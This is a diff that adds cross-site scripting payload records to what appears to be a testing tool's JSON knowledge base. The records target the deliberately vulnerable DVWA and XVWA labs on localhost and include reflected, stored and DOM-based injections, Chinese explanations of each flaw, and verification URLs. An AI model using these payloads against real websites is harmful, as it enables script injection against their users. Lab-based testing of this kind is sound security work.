@@ -470,5 +470,44 @@
     "reference_payload": "http://localhost:8081/vulnerabilities/xss_d/?default=English#<img src=x onerror=alert(1)>",
     "principle": "服务端只校验 query 的 default 值，客户端 sink 用完整 location.href 含 #fragment；把 payload 放 URL fragment，服务端白名单照过，前端 document.write 执行",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030203107",
+    "context": "XVWA /xvwa/vulnerabilities/reflected_xss/?item= 参数原样反射进 HTML 文本上下文(<p>内)，未 HTML 编码尖括号",
+    "reference_payload": "<script>alert(document.domain)</script>",
+    "principle": "反射型 XSS：item 参数直接回显到 HTML 文本节点，无转义，标签可执行 JS",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/reflected_xss/?item={payload}",
+    "evidence": {
+      "verify": "alert",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/reflected_xss/?item={payload}",
+      "match": "localhost"
+    }
+  },
+  {
+    "id": "auto-20261030203119",
+    "context": "XVWA /xvwa/vulnerabilities/stored_xss/ POST name+msg 存入评论表，每次访问页面原样输出 <script>，无转义",
+    "reference_payload": "POST name=storer1&msg=<script>alert('stored1')</script> → 之后访问 /stored_xss/ 自动触发",
+    "principle": "存储型 XSS：用户输入落库，每次页面加载原样渲染 script，任何访问者都执行",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/stored_xss/",
+    "evidence": {
+      "verify": "alert",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/stored_xss/",
+      "match": "stored1"
+    }
+  },
+  {
+    "id": "auto-20261030203127",
+    "context": "XVWA /xvwa/vulnerabilities/dom_xss/ 客户端JS取 document.URL 的 ?search= 值，unescape()后写入 document.getElementById('srch').innerHTML，不经过服务端",
+    "reference_payload": "?search=<img src=x onerror=alert(document.domain)>",
+    "principle": "DOM XSS：source=document.URL 的 search 参数 → sink=innerHTML，客户端未过滤直接写入，注入 img onerror 执行",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/dom_xss/?search={payload}",
+    "evidence": {
+      "verify": "alert",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/dom_xss/?search={payload}",
+      "match": "localhost"
+    }
   }
 ]
